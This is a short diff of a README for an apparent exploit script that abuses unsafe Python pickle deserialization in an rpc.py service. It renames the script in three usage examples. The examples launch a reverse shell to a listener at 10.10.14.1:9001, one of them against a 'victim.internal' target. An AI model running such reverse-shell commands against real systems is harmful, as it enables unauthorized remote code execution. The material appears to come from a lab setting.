@@ -34,15 +34,15 @@ The vulnerability lies in rpc.py's unsafe usage of Python's `pickle` module, all
 
 ### Reverse Shell Example
 ```bash
-python3 rpc-rce-x7331.py --lhost 10.10.14.1 --lport 9001
+python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001
 ```
 ### Dry Run (no shell, just curl test)
 ```bash
-python3 rpc-rce-x7331.py --lhost 10.10.14.1 --lport 9001 --dry-run
+python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001 --dry-run
 ```
 ### Custom Target (optional)
 ```bash
-python3 rpc-rce-x7331.py --lhost 10.10.14.1 --lport 9001 --target http://victim.internal:65432/sayhi
+python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001 --target http://victim.internal:65432/sayhi
 ```
 ## Requirements
 - Python `3.x`
